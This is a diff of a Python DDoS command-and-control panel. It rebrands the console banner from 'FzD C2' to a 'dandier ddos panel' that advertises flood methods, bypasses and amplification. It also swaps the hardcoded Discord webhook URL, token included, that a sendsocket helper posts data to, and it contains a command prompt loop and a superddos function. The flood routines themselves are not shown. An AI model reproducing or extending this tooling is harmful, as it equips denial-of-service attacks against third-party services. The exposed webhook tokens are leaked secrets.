@@ -21,28 +21,24 @@ def sendsocket(socket_url, message):
     }
     response = requests.post(socket_url, data=json.dumps(data), headers=headers)
 
-def menu(): 
-     sys.stdout.write(f"         \x1b]2;FzD C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07") 
-     os.system('cls' if os.name == 'nt' else 'clear') 
-     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
-     print("") 
-     print(""" 
-                        ,     ,                        
-                        |\---/|                   Support By : <177 Members & Dandier & Zelly Noy>
-                       /  , , |                   Vip : <True>     
-                  __.-'|  / \ /                   User : <Root>     
-         __ ___.-'        ._O|                        
-      .-'  '        :      _/                     ╒══════════════════════════════════════════════════════╕   
-     / ,    .        .     |                        This tools is not for sell. Private tools and method.
-    :  ;    :        :   _/                         Credit : ZxCDDoSS
-    |  |   .'     __:   /                           Team   : FzDDoSS
-    |  :   /'----'| \  |                          ╘══════════════════════════════════════════════════════╛
-    \  |\  |      | /| |                        
-     '.'| /       || \ |                        
-     | /|.'       '.l \\_                        
-     || ||             '-'                        
-     '-''-'
- """)
+def main():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f'''
+\033[1;31;40m
+
+	         ██████╗░██████╗░░█████╗░░██████╗
+	         ██╔══██╗██╔══██╗██╔══██╗██╔════╝
+	         ██║░░██║██║░░██║██║░░██║╚█████╗░
+	         ██║░░██║██║░░██║██║░░██║░╚═══██╗
+	         ██████╔╝██████╔╝╚█████╔╝██████╔╝
+	         ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
+	
+	      \033[1;37;40m    welcome to dandier ddos panel 
+	
+	               \033[1;32;40m dandier\033[1;37;40m [\033[1;33;40mvvip\033[1;37;40m] 
+	    
+	         \033[1;32;40m gangbang\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]   \033[1;32;40m flood\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]
+''')
     while True:
         cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88ml\x1b[38;2;0;113;133mi\x1b[38;2;0;49;147m]
 \x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤  \x1b[38;2;239;239;239m''')
@@ -88,7 +84,7 @@ def menu():
             except IndexError:
                 pass
                 
-socket_url = "https://discord.com/api/webhooks/1123200627351240776/HSNj_RHdhmjyBj6F2Zz3Pdb4XX6osq90liUFDXyHL7-gyRptyBwSKGvxQm1bF7Hx49Lm"
+socket_url = "https://discord.com/api/webhooks/1120049356687560726/HCEGcv4uqlTu4X5ATB7sVLihAUVXxfWdC9yYikP3MFaYJ4yfjpwhKno-F9DrT-SoPrTQ"
 
 def superddos():
     os.chdir('..') 
